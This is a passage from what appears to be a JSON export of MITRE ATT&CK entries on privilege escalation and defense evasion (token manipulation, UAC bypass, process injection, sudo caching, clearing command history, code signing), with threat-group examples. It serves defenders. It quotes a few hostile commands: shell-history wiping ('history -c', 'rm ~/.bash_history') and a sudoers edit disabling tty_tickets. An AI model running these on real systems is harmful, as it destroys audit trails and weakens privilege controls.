            "Description": "Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token. For example, Microsoft promotes the use of access tokens as a security best practice. Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command runas. [1]Adversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system. [2]Access tokens can be leveraged by adversaries through three methods: [3]Token Impersonation/Theft - An adversary creates a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread. This is useful for when the target user has a non-network logon session on the system.Create Process with a Token - An adversary creates a new access token with DuplicateToken(Ex) and uses it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.Make and Impersonate Token - An adversary has a username and password but the user is not logged onto the system. The adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.Metasploit’s Meterpreter payload allows arbitrary token manipulation and uses token impersonation to escalate privileges. [4]  The Cobalt Strike beacon payload allows arbitrary token impersonation and can also create tokens. [5]\n",
            "ID": "T1134",
            "Tactic": "Defense Evasion, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Effective Permissions: ": "SYSTEM",
            "Data Sources: ": "API monitoring, Access tokens, Process monitoring, Process command-line parameters",
            "Contributors: ": "Tom Ueltschi @c_APT_ure; Travis Smith, Tripwire; Robby Winchester, @robwinchester3; Jared Atkinson, @jaredcatkinson",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.[6]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.[7]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can steal access tokens from exiting processes and make tokens from known credentials.[8]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.[9]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher uses token manipulation with NtFilterToken as part of UAC bypass.[10][11]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can adjust token privileges.[12]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.[13][14]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Invoke-TokenManipulation Exfiltration module can be used to locate and impersonate user logon tokens.[15][16]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.[17]"
                },
                {
                    "Name": "SslMM",
                    "Description": "SslMM contains a feature to manipulate process privileges and tokens.[18]"
                }
            ]
        },
        "Bypass User Account Control": {
            "Name": "Bypass User Account Control",
            "Description": "Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. [1]If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. [2] [3] An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. [4] Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods [5] that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:eventvwr.exe can auto-elevate and execute a specified binary or script. [6] [7]Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. [8]\n",
            "ID": "T1088",
            "Tactic": "Defense Evasion, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "User, Administrator",
            "Effective Permissions: ": "Administrator",
            "Data Sources: ": "System calls, Process monitoring, Authentication logs, Process command-line parameters",
            "Defense Bypassed: ": "Windows User Account Control",
            "Contributors: ": "Stefan Kanthak; Casey Smith",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT29",
                    "Description": "APT29 has bypassed UAC.[9]"
                },
                {
                    "Name": "AutoIt backdoor",
                    "Description": "AutoIt backdoor attempts to escalate privileges by bypassing User Access Control.[10]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.[11]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER malware xxmm contains a UAC bypass tool for privilege escalation.[12]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has bypassed UAC.[13]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can use a number of known techniques to bypass Windows UAC.[14]"
                },
                {
                    "Name": "Downdelph",
                    "Description": "Downdelph bypasses UAC to escalate privileges by using a custom \"RedirectEXE\" shim database.[15]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher performs UAC bypass.[16][17]"
                },
                {
                    "Name": "H1N1",
                    "Description": "H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).[18]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee uses a combination of NTWDBLIB.dll and cliconfg.exe to bypass UAC protections using DLL hijacking.[19]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can bypass UAC and create an elevated COM object to escalate privileges.[20]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe.[21]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork bypassed User Access Control (UAC).[22]"
                },
                {
                    "Name": "PLAINTEE",
                    "Description": "An older variant of PLAINTEE performs UAC bypass.[23]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.[24]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.[25]"
                },
                {
                    "Name": "Sakula",
                    "Description": "Sakula contains UAC bypass code for both 32- and 64-bit systems.[26]"
                },
                {
                    "Name": "Shamoon",
                    "Description": "Shamoon attempts to disable UAC remote restrictions by modifying the Registry.[27]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges.[28]"
                },
                {
                    "Name": "UACMe",
                    "Description": "UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.[5]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.[29]"
                }
            ]
        },
        "Exploitation for Privilege Escalation": {
            "Name": "Exploitation for Privilege Escalation",
            "Description": "Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform Privilege Escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This may be a necessary step for an adversary compromising a endpoint system that has been properly configured and limits other privilege escalation methods.\n",
            "ID": "T1068",
            "Tactic": "Privilege Escalation",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Effective Permissions: ": "User",
            "Data Sources: ": "Windows Error Reporting, Process monitoring, Application logs",
            "CAPEC ID: ": "CAPEC-69",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 has used CVE-2014-4076, CVE-2015-2387, and CVE-2015-1701 to escalate privileges.[1][2]"
                },
                {
                    "Name": "APT32",
                    "Description": "APT32 has used CVE-2016-7255 to escalate privileges.[3]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has used exploits to increase their levels of rights and privileges.[4]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can exploit vulnerabilities such as MS14-058.[5]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.[6]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used tools to exploit Windows vulnerabilities in order to escalate privileges. The tools targeted CVE-2013-3660, CVE-2011-2005, and CVE-2010-4398, all of which could allow local users to access kernel-level privileges.[7]"
                },
                {
                    "Name": "FIN8",
                    "Description": "FIN8 has exploited the CVE-2016-0167 local vulnerability.[8][9]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT has exploited CVE-2015-1701 and CVE-2015-2387 to escalate privileges.[10][11]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has leveraged a zero-day vulnerability to escalate privileges.[12]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec has a plugin to drop and execute vulnerable Outpost Sandbox or avast! Virtualization drivers in order to gain kernel mode privileges.[13]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used CVE-2014-6324 to escalate privileges.[14]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird exploits CVE-2016-4117 to allow an executable to gain escalated privileges.[15]"
                }
            ]
        },
        "Extra Window Memory Injection": {
            "Name": "Extra Window Memory Injection",
            "Description": "Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). [1] Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. [2] [3]Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.Execution granted through EWM injection may take place in the address space of a separate live process. Similar to Process Injection, this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. [4] More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. [5] [6]\n",
            "ID": "T1181",
            "Tactic": "Defense Evasion, Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Process monitoring",
            "Defense Bypassed: ": "Anti-virus, Host intrusion prevention systems, Data Execution Prevention",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Power Loader",
                    "Description": "Power Loader overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe.[5][6]"
                }
            ]
        },
        "Process Injection": {
            "Name": "Process Injection",
            "Description": "Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.WindowsThere are multiple approaches to injecting code into a live process. Windows implementations include: [1]Dynamic-link library (DLL) injection involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.Portable executable injection involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. [2]Thread execution hijacking involves injecting malicious code or the path to a DLL into a thread of a process. Similar to Process Hollowing, the thread must first be suspended.Asynchronous Procedure Call (APC) injection involves attaching malicious code to the APC Queue [3] of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. [4]  AtomBombing  [5] is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. [6]Thread Local Storage (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. [7]Mac and LinuxImplementations for Linux and OS X/macOS systems include: [8] [9]LD_PRELOAD, LD_LIBRARY_PATH (Linux), DYLD_INSERT_LIBRARIES (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. [10]Ptrace system calls can be used to attach to a running process and modify it in runtime. [9]/proc/[pid]/mem provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. [9]VDSO hijacking performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. [11]Malware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.\n",
            "ID": "T1055",
            "Tactic": "Defense Evasion, Privilege Escalation",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM, root",
            "Effective Permissions: ": "User, Administrator, SYSTEM, root",
            "Data Sources: ": "API monitoring, Windows Registry, File monitoring, DLL monitoring, Process monitoring, Named Pipes",
            "Defense Bypassed: ": "Process whitelisting, Anti-virus",
            "CAPEC ID: ": "CAPEC-242",
            "Contributors: ": "Anastasios Pingios; Christiaan Beek, @ChristiaanBeek; Ryan Becwar",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT37",
                    "Description": "APT37 injects its malware variant, ROKRAT, into the cmd.exe process.[12]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea injects itself into explorer.exe.[13]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy injects its DLL component into svchost.exe.[14]"
                },
                {
                    "Name": "Carbanak",
                    "Description": "Carbanak downloads an executable and injects it directly into a new process.[15]"
                },
                {
                    "Name": "Cobalt Group",
                    "Description": "Cobalt Group has injected code into trusted processes.[16]"
                },
                {
                    "Name": "Cobalt Strike",
                    "Description": "Cobalt Strike can inject a variety of payloads into processes dynamically chosen by the adversary.[17]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi injects itself into the secure shell (SSH) process.[18]"
                },
                {
                    "Name": "Duqu",
                    "Description": "Duqu will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).[19]"
                },
                {
                    "Name": "Dyre",
                    "Description": "Dyre injects into other processes to load modules.[20]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise injects DLL files into iexplore.exe.[21]"
                },
                {
                    "Name": "Emissary",
                    "Description": "Emissary injects its DLL file into a newly spawned Internet Explorer process.[22]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher injects itself into various processes depending on whether it is low integrity or high integrity.[23][24]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer performs thread execution hijacking to inject its orchestrator into a running thread from a remote process. Gazer performs a separate injection of its communication module into an Internet accessible process through which it performs C2.[25][26]"
                },
                {
                    "Name": "Gorgon Group",
                    "Description": "Gorgon Group malware can download a remote access tool, NanoCore, and inject into another process.[27]"
                },
                {
                    "Name": "HIDEDRV",
                    "Description": "HIDEDRV injects a DLL for Downdelph into the explorer.exe process.[28]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee uses a batch file to load a DLL into the svchost.exe process.[29]"
                },
                {
                    "Name": "JHUHUGIT",
                    "Description": "JHUHUGIT performs code injection injecting its own functions to browser processes.[30][31]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can inject content into lsass.exe to load a module.[32]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "If running in a Windows environment, Kazuar saves a DLL to disk that is injected into the explorer.exe process to execute the payload. Kazuar can also be configured to inject and execute within specific processes.[33]"
                },
                {
                    "Name": "Koadic",
                    "Description": "Koadic can perform process injection by using a reflective DLL.[34]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "A Lazarus Group malware sample performs reflective DLL injection.[35]"
                },
                {
                    "Name": "Matroyshka",
                    "Description": "Matroyshka uses reflective DLL injection to inject the malicious library and execute the RAT.[36]"
                },
                {
                    "Name": "NavRAT",
                    "Description": "NavRAT copies itself into a running Internet Explorer process to evade detection.[37]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has used various methods of process injection including hot patching.[32]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy can inject a malicious DLL into a process.[38][39]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit contains a collection of CodeExecution modules that enable by injecting code (DLL, shellcode) or reflectively loading a Windows PE file into a process.[40][41]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy can migrate into another process using reflective DLL injection.[42]"
                },
                {
                    "Name": "Putter Panda",
                    "Description": "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).[43]"
                },
                {
                    "Name": "RARSTONE",
                    "Description": "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This \"downloaded\" file is actually not dropped onto the system.[44]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA performs a reflective DLL injection using a given pid.[45][46]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can perform DLL injection.[47]"
                },
                {
                    "Name": "Smoke Loader",
                    "Description": "Smoke Loader injects into the Internet Explorer process.[48]"
                },
                {
                    "Name": "Socksbot",
                    "Description": "Socksbot creates a suspended svchost process and injects its DLL into it.[49]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.[50]"
                },
                {
                    "Name": "Taidoor",
                    "Description": "Taidoor can perform DLL loading.[51]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "A Threat Group-3390 tool can spawn svchost.exe and inject the payload into that process.[52][53]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot injects into the svchost.exe process.[54][55][56]"
                },
                {
                    "Name": "Turla",
                    "Description": "Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.[57][58]"
                },
                {
                    "Name": "TURNEDUP",
                    "Description": "TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\"[4]"
                },
                {
                    "Name": "Wiarp",
                    "Description": "Wiarp creates a backdoor through which remote attackers can inject files into running processes.[59]"
                },
                {
                    "Name": "Wingbird",
                    "Description": "Wingbird performs multiple process injections to hijack system processes and execute malicious code.[60]"
                }
            ]
        },
        "SID-History Injection": {
            "Name": "SID-History Injection",
            "Description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. [1] An account can hold additional SIDs in the SID-History Active Directory attribute [2], allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values [3] may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, Windows Admin Shares, or Windows Remote Management.\n",
            "ID": "T1178",
            "Tactic": "Privilege Escalation",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Authentication logs, Windows event logs",
            "Contributors: ": "Vincent Le Toux; Alain Homewood, Insomnia Security",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz's MISC::AddSid module can appended any SID or user/group account to a user's SID-History. Mimikatz also utilizes SID-History Injection to expand the scope of other components such as generated Kerberos Golden Tickets and DCSync beyond a single domain.[4][5]"
                }
            ]
        },
        "Sudo": {
            "Name": "Sudo",
            "Description": "The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL [1]. Adversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.\n",
            "ID": "T1169",
            "Tactic": "Privilege Escalation",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Effective Permissions: ": "root",
            "Data Sources: ": "File monitoring",
            "Version": "1.0"
        },
        "Sudo Caching": {
            "Name": "Sudo Caching",
            "Description": "The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" [1] Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout that is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).Adversaries can abuse poor configurations of this to escalate privileges without needing the user's password. /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. When tty_tickets is disabled, adversaries can do this from any tty for that user. The OSX Proton Malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers [2]. In order for this change to be reflected, the Proton malware also must issue killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.\n",
            "ID": "T1206",
            "Tactic": "Privilege Escalation",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Effective Permissions: ": "root",
            "Data Sources: ": "File monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Proton",
                    "Description": "Proton modifies the tty_tickets line in the sudoers file.[3]"
                }
            ]
        },
        "Binary Padding": {
            "Name": "Binary Padding",
            "Description": "Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.\n",
            "ID": "T1009",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS, Windows",
            "Data Sources: ": "Binary file metadata, File monitoring, Malware reverse engineering",
            "Defense Bypassed: ": "Signature-based detection, Anti-virus",
            "CAPEC ID: ": "CAPEC-572",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT32",
                    "Description": "APT32 includes garbage code to mislead anti-malware software and researchers.[1]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.[2]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.[3]"
                },
                {
                    "Name": "CORESHELL",
                    "Description": "CORESHELL contains unused machine instructions in a likely attempt to hinder analysis.[4]"
                },
                {
                    "Name": "Emissary",
                    "Description": "A variant of Emissary appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.[5]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher contains junk code in its functions in an effort to confuse disassembly programs.[6][7]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Before writing to disk, Kwampirs inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.[8]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has inserted garbage characters into code, presumably to avoid anti-virus detection.[9]"
                },
                {
                    "Name": "Moafee",
                    "Description": "Moafee has been known to employ binary padding.[10]"
                },
                {
                    "Name": "Patchwork",
                    "Description": "Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.[11]"
                },
                {
                    "Name": "XTunnel",
                    "Description": "A version of XTunnel introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.[12]"
                },
                {
                    "Name": "yty",
                    "Description": "yty contains junk code in its binary, likely to confuse malware analysts.[13]"
                },
                {
                    "Name": "ZeroT",
                    "Description": "ZeroT has obfuscated DLLs and functions using dummy API calls inserted between real instructions.[14]"
                }
            ]
        },
        "Clear Command History": {
            "Name": "Clear Command History",
            "Description": "macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as unset HISTFILE, export HISTFILESIZE=0, history -c, rm ~/.bash_history.\n",
            "ID": "T1146",
            "Tactic": "Defense Evasion",
            "Platform: ": "Linux, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "Authentication logs, File monitoring",
            "Defense Bypassed: ": "Log analysis, Host forensic analysis",
            "Version": "1.0"
        },
        "Code Signing": {
            "Name": "Code Signing",
            "Description": "Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. [1] However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries [2]. The certificates used during an operation may be created, forged, or stolen by the adversary. [3] [4]Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. [1]Code signing certificates may be used to bypass security policies that require signed code to execute on a system.\n",
            "ID": "T1116",
            "Tactic": "Defense Evasion",
            "Platform: ": "macOS, Windows",
            "Data Sources: ": "Binary file metadata",
            "Defense Bypassed: ": "Windows User Account Control",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT37",
                    "Description": "APT37 has signed its malware with an invalid digital certificates listed as \"Tencent Technology (Shenzhen) Company Limited.\"[5]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS is sometimes signed with an invalid Authenticode certificate in an apparent effort to make it look more legitimate.[6]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes samples were digitally signed with a certificate originally used by Hacking Team that was later leaked and subsequently revoked.[7][8][9]"
                },
                {
                    "Name": "CopyKittens",
                    "Description": "CopyKittens digitally signed an executable with a stolen certificate from legitimate company AI Squared.[10]"
                },
                {
                    "Name": "Darkhotel",
                    "Description": "Darkhotel has used code-signing certificates on its malware that are either forged due to weak keys or stolen.[11]"
                },
                {
                    "Name": "Daserf",
                    "Description": "Some Daserf samples were signed with a stolen digital certificate.[12]"
                },
                {
                    "Name": "Epic",
                    "Description": "Turla has used valid digital certificates from Sysprint AG to sign its Epic dropper.[13]"
                },
                {
                    "Name": "FIN7",
                    "Description": "FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.[14][15]"
                },
                {
                    "Name": "Gazer",
                    "Description": "Gazer versions are signed with various valid certificates; one was likely faked and issued by Comodo for \"Solid Loop Ltd,\" and another was issued for \"Ultimate Computer Support Ltd.\"[16][17]"
                },
                {
                    "Name": "Helminth",
                    "Description": "Helminth samples have been signed with legitimate, compromised code signing certificates owned by software company AI Squared.[18]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee uses a dropper called MaoCheng that harvests a stolen digital signature from Adobe Systems.[19]"
                },
                {
                    "Name": "Janicab",
                    "Description": "Janicab used a valid AppleDeveloperID to sign the code to get past security restrictions.[2]"
                },
                {
                    "Name": "Leviathan",
                    "Description": "Leviathan has used stolen code signing certificates used to sign malware.[20]"
                },
                {
                    "Name": "Molerats",
                    "Description": "Molerats has used forged Microsoft code-signing certificates on malware.[21]"
                },
                {
                    "Name": "Nerex",
                    "Description": "Nerex drops a signed Microsoft DLL to disk.[22]"
                },
                {
                    "Name": "NETWIRE",
                    "Description": "The NETWIRE client has been signed by fake and invalid digital certificates.[23]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "A QuasarRAT .dll file is digitally signed by a certificate from AirVPN.[24]"
                },
                {
                    "Name": "Regin",
